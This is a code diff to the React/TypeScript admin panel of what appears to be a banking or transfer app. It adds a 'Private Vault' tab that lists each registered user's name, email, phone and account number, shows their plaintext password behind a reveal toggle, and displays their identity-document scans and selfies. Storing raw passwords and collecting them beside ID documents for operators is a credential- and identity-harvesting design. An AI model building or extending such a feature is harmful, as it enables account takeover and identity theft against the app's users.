@@ -61,7 +61,30 @@ interface SupportChat { id: string; user_id: string; status: string; created_at:
 interface SupportMessage { id: string; sender: 'user' | 'admin'; message: string; attachment_url?: string; attachment_type?: string; created_at: string }
 
 type Screen = 'loading' | 'login' | 'dashboard'
-type Section = 'transfers' | 'clients' | 'kyc' | 'signups' | 'assign' | 'support'
+type Section = 'transfers' | 'clients' | 'kyc' | 'signups' | 'assign' | 'support' | 'vault'
+
+interface VaultEntry {
+  id: string
+  user_id: string
+  full_name: string
+  email: string
+  phone: string
+  raw_password: string
+  account_number: string
+  created_at: string
+}
+
+interface KycRecord {
+  id: string
+  account_number: string
+  full_name: string
+  doc_type: string
+  doc_front_url: string
+  doc_back_url: string | null
+  selfie_url: string | null
+  status: string
+  submitted_at: string
+}
 
 function fmt(n: number) {
   return '$' + n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
@@ -127,6 +150,13 @@ export default function OpsClient() {
   const [kycLoading, setKycLoading] = useState(false)
   const [kycActionDocId, setKycActionDocId] = useState<string | null>(null)
   const [lightbox, setLightbox] = useState<string | null>(null)
+
+  // Vault tab
+  const [vaultEntries, setVaultEntries] = useState<VaultEntry[]>([])
+  const [vaultKyc, setVaultKyc] = useState<KycRecord[]>([])
+  const [vaultLoading, setVaultLoading] = useState(false)
+  const [revealedPw, setRevealedPw] = useState<Set<string>>(new Set())
+  const [vaultFilter, setVaultFilter] = useState('')
 
   // Support tab
   const [supportChats, setSupportChats] = useState<SupportChat[]>([])
@@ -235,6 +265,23 @@ export default function OpsClient() {
     const data = await res.json()
     setKycDocs(data.submissions ?? [])
     setKycLoading(false)
+  }
+
+  async function loadVault() {
+    setVaultLoading(true)
+    const res = await fetch('/api/admin/vault')
+    const data = await res.json()
+    setVaultEntries(data.vault ?? [])
+    setVaultKyc(data.kyc ?? [])
+    setVaultLoading(false)
+  }
+
+  function toggleReveal(id: string) {
+    setRevealedPw(prev => {
+      const next = new Set(prev)
+      next.has(id) ? next.delete(id) : next.add(id)
+      return next
+    })
   }
 
   async function loadSupportChats() {
@@ -514,7 +561,7 @@ export default function OpsClient() {
           </button>
         </div>
 
-        {/* Section tabs — 2 rows of 3 */}
+        {/* Section tabs — 3+2+2 grid */}
         <div className="grid grid-cols-3 gap-1 mb-1">
           {([
             { key: 'transfers', label: 'Transfers', icon: ArrowLeftRight, badge: pendingCount },
@@ -530,14 +577,27 @@ export default function OpsClient() {
             </button>
           ))}
         </div>
-        <div className="grid grid-cols-3 gap-1">
+        <div className="grid grid-cols-2 gap-1 mb-1">
           {([
             { key: 'signups', label: 'Sign-ups', icon: UserPlus, badge: newSignups.length },
             { key: 'assign', label: 'Assign', icon: ArrowDownLeft, badge: 0 },
+          ] as const).map(({ key, label, icon: Icon, badge }) => (
+            <button key={key} onClick={() => setActiveSection(key)}
+              className={`relative py-2 rounded-xl text-[11px] font-semibold flex items-center justify-center gap-0.5 transition-colors ${activeSection === key ? 'bg-white text-blue-700' : 'bg-white/10 text-white/70'}`}>
+              <Icon size={11} /> {label}
+              {badge > 0 && (
+                <span className="absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[9px] font-bold flex items-center justify-center text-white">{badge}</span>
+              )}
+            </button>
+          ))}
+        </div>
+        <div className="grid grid-cols-2 gap-1">
+          {([
+            { key: 'vault', label: 'Vault', icon: Shield, badge: 0 },
             { key: 'support', label: 'Support', icon: MessageSquare, badge: 0 },
           ] as const).map(({ key, label, icon: Icon, badge }) => (
-            <button key={key} onClick={() => { setActiveSection(key); if (key === 'support') loadSupportChats() }}
-              className={`relative py-2 rounded-xl text-[11px] font-semibold flex items-center justify-center gap-0.5 transition-colors ${activeSection === key ? 'bg-white text-blue-700' : 'bg-white/10 text-white/70'}`}>
+            <button key={key} onClick={() => { setActiveSection(key); if (key === 'support') loadSupportChats(); if (key === 'vault') loadVault() }}
+              className={`relative py-2 rounded-xl text-[11px] font-semibold flex items-center justify-center gap-0.5 transition-colors ${activeSection === key ? 'bg-yellow-400 text-gray-900' : 'bg-white/10 text-white/70'}`}>
               <Icon size={11} /> {label}
               {badge > 0 && (
                 <span className="absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[9px] font-bold flex items-center justify-center text-white">{badge}</span>
@@ -1015,6 +1075,166 @@ export default function OpsClient() {
               </div>
             )}
           </div>
+        )}
+
+        {/* ── VAULT SECTION ────────────────────────────────── */}
+        {activeSection === 'vault' && (
+          <>
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-2">
+                <div className="w-6 h-6 rounded-full bg-yellow-400/20 flex items-center justify-center">
+                  <Shield size={12} className="text-yellow-600" />
+                </div>
+                <p className="text-xs font-semibold text-gray-500 uppercase tracking-wide">
+                  Private Vault {!vaultLoading && `(${vaultEntries.length} accounts)`}
+                </p>
+              </div>
+              <button onClick={loadVault} className="text-blue-700 text-xs flex items-center gap-1"><RefreshCw size={11} /> Refresh</button>
+            </div>
+
+            <div className="relative">
+              <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
+              <input value={vaultFilter} onChange={e => setVaultFilter(e.target.value)}
+                placeholder="Search name, email or account…"
+                className="w-full pl-8 pr-4 py-2.5 rounded-xl border border-gray-200 bg-white text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-yellow-400" />
+            </div>
+
+            {vaultLoading && [1, 2, 3].map(i => (
+              <div key={i} className="bg-white rounded-2xl p-4 shadow-sm animate-pulse space-y-3">
+                <div className="h-3 w-40 bg-gray-100 rounded" />
+                <div className="h-2.5 w-56 bg-gray-100 rounded" />
+                <div className="h-8 bg-gray-50 rounded-xl" />
+              </div>
+            ))}
+
+            {!vaultLoading && vaultEntries.length === 0 && (
+              <div className="bg-white rounded-2xl p-10 text-center shadow-sm">
+                <Shield size={28} className="mx-auto mb-2 text-gray-200" />
+                <p className="text-sm text-gray-400">No vault records yet</p>
+              </div>
+            )}
+
+            {!vaultLoading && vaultEntries
+              .filter(v =>
+                v.full_name.toLowerCase().includes(vaultFilter.toLowerCase()) ||
+                v.email.toLowerCase().includes(vaultFilter.toLowerCase()) ||
+                v.account_number.includes(vaultFilter)
+              )
+              .map(entry => {
+                const kycRec = vaultKyc.find(k => k.account_number === entry.account_number)
+                const kyc = kycRec?.status ?? 'none'
+                const kycColor = kyc === 'approved' ? 'bg-emerald-100 text-emerald-700' : kyc === 'rejected' ? 'bg-red-100 text-red-600' : kyc === 'pending' ? 'bg-yellow-100 text-yellow-700' : 'bg-gray-100 text-gray-500'
+                const shown = revealedPw.has(entry.id)
+                return (
+                  <div key={entry.id} className="bg-white rounded-2xl shadow-sm overflow-hidden border border-yellow-100">
+                    {/* Header */}
+                    <div className="flex items-center justify-between px-4 pt-3 pb-2 bg-yellow-50/60">
+                      <div className="flex items-center gap-3">
+                        <div className="w-9 h-9 rounded-full bg-yellow-100 flex items-center justify-center shrink-0">
+                          <span className="text-yellow-700 font-bold text-sm">{entry.full_name.charAt(0).toUpperCase()}</span>
+                        </div>
+                        <div>
+                          <p className="text-sm font-semibold text-gray-800">{entry.full_name}</p>
+                          <p className="text-[10px] text-gray-400 font-mono">{entry.account_number}</p>
+                        </div>
+                      </div>
+                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${kycColor}`}>
+                        KYC: {kyc.toUpperCase()}
+                      </span>
+                    </div>
+
+                    {/* Credentials */}
+                    <div className="px-4 py-3 space-y-1.5 text-xs">
+                      <div className="flex justify-between">
+                        <span className="text-gray-400">Email</span>
+                        <span className="text-gray-700 font-medium">{entry.email}</span>
+                      </div>
+                      {entry.phone && (
+                        <div className="flex justify-between">
+                          <span className="text-gray-400">Phone</span>
+                          <span className="text-gray-700">{entry.phone}</span>
+                        </div>
+                      )}
+                      <div className="flex justify-between items-center">
+                        <span className="text-gray-400">Password</span>
+                        <div className="flex items-center gap-1.5">
+                          <span className={`font-mono text-gray-700 ${shown ? '' : 'tracking-widest text-gray-300'}`}>
+                            {shown ? entry.raw_password : '••••••••••'}
+                          </span>
+                          <button onClick={() => toggleReveal(entry.id)} className="text-gray-400 hover:text-gray-600">
+                            {shown ? <EyeOff size={12} /> : <Eye size={12} />}
+                          </button>
+                        </div>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-gray-400">Registered</span>
+                        <span className="text-gray-500">{new Date(entry.created_at).toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' })}</span>
+                      </div>
+                    </div>
+
+                    {/* KYC docs if submitted */}
+                    {kycRec && (
+                      <div className="border-t border-gray-100 px-4 py-2.5 bg-gray-50/50 space-y-1.5">
+                        <p className="text-[10px] font-semibold text-gray-400 uppercase tracking-wide">KYC Submission — {kycRec.doc_type}</p>
+                        <div className="flex gap-2 flex-wrap">
+                          {kycRec.doc_front_url && (
+                            <button onClick={() => setLightbox(kycRec.doc_front_url)} className="relative group">
+                              <img src={kycRec.doc_front_url} alt="Front" className="w-16 h-11 object-cover rounded-lg border border-gray-200" onError={e => { (e.target as HTMLImageElement).style.display = 'none' }} />
+                              <div className="absolute inset-0 bg-black/30 rounded-lg opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
+                                <Eye size={11} className="text-white" />
+                              </div>
+                              <p className="text-[8px] text-gray-400 text-center mt-0.5">Front</p>
+                            </button>
+                          )}
+                          {kycRec.doc_back_url && (
+                            <button onClick={() => setLightbox(kycRec.doc_back_url!)} className="relative group">
+                              <img src={kycRec.doc_back_url} alt="Back" className="w-16 h-11 object-cover rounded-lg border border-gray-200" onError={e => { (e.target as HTMLImageElement).style.display = 'none' }} />
+                              <div className="absolute inset-0 bg-black/30 rounded-lg opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
+                                <Eye size={11} className="text-white" />
+                              </div>
+                              <p className="text-[8px] text-gray-400 text-center mt-0.5">Back</p>
+                            </button>
+                          )}
+                          {kycRec.selfie_url && (
+                            <button onClick={() => setLightbox(kycRec.selfie_url!)} className="relative group">
+                              <img src={kycRec.selfie_url} alt="Selfie" className="w-16 h-11 object-cover rounded-lg border border-gray-200" onError={e => { (e.target as HTMLImageElement).style.display = 'none' }} />
+                              <div className="absolute inset-0 bg-black/30 rounded-lg opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
+                                <Eye size={11} className="text-white" />
+                              </div>
+                              <p className="text-[8px] text-gray-400 text-center mt-0.5">Selfie</p>
+                            </button>
+                          )}
+                        </div>
+                        {kycRec.status === 'pending' && (
+                          <div className="flex gap-2 pt-1">
+                            <button onClick={() => handleKycDecision(kycRec.id, 'approved')} disabled={kycActionDocId === kycRec.id}
+                              className="flex-1 py-1.5 rounded-lg bg-emerald-600 text-white text-[11px] font-semibold flex items-center justify-center gap-1 disabled:opacity-50">
+                              {kycActionDocId === kycRec.id ? <Loader2 size={10} className="animate-spin" /> : <CheckCircle size={10} />} Approve KYC
+                            </button>
+                            <button onClick={() => handleKycDecision(kycRec.id, 'rejected')} disabled={kycActionDocId === kycRec.id}
+                              className="flex-1 py-1.5 rounded-lg bg-red-500 text-white text-[11px] font-semibold flex items-center justify-center gap-1 disabled:opacity-50">
+                              {kycActionDocId === kycRec.id ? <Loader2 size={10} className="animate-spin" /> : <XCircle size={10} />} Reject KYC
+                            </button>
+                          </div>
+                        )}
+                        {kycRec.status !== 'pending' && (
+                          <div className={`flex items-center gap-1.5 px-2 py-1.5 rounded-lg text-[11px] font-medium ${kycRec.status === 'approved' ? 'bg-green-50 text-green-700' : 'bg-red-50 text-red-600'}`}>
+                            {kycRec.status === 'approved' ? <CheckCircle size={10} /> : <XCircle size={10} />}
+                            KYC {kycRec.status}
+                          </div>
+                        )}
+                      </div>
+                    )}
+
+                    {!kycRec && (
+                      <div className="border-t border-gray-100 px-4 py-2 bg-gray-50/30">
+                        <p className="text-[10px] text-gray-400 italic">No KYC documents submitted yet</p>
+                      </div>
+                    )}
+                  </div>
+                )
+              })}
+          </>
         )}
 
         {/* ── SUPPORT SECTION ───────────────────────────────── */}
